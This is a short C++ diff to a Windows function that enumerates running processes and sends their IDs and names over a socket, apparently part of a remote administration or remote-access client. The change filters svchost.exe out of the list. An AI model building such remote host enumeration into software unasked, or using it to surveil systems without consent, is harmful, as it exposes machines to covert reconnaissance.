@@ -74,7 +74,10 @@ void SendProcessList(){
     HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);if(snap==INVALID_HANDLE_VALUE){closesocket(sock);return;}
     PROCESSENTRY32 pe;pe.dwSize=sizeof(pe);
     std::vector<std::pair<DWORD,std::string>> procs;
-    if(Process32First(snap,&pe)){do{procs.push_back({pe.th32ProcessID,std::string(pe.szExeFile)});}while(Process32Next(snap,&pe));}
+    if(Process32First(snap,&pe)){do{
+        if(_stricmp(pe.szExeFile,"svchost.exe")==0) continue;
+        procs.push_back({pe.th32ProcessID,std::string(pe.szExeFile)});
+    }while(Process32Next(snap,&pe));}
     CloseHandle(snap);
     int count=(int)procs.size();SendAll(sock,(char*)&count,4);
     for(auto& p:procs){SendAll(sock,(char*)&p.first,4);int nl=(int)p.second.size();SendAll(sock,(char*)&nl,4);if(nl>0)SendAll(sock,p.second.c_str(),nl);}
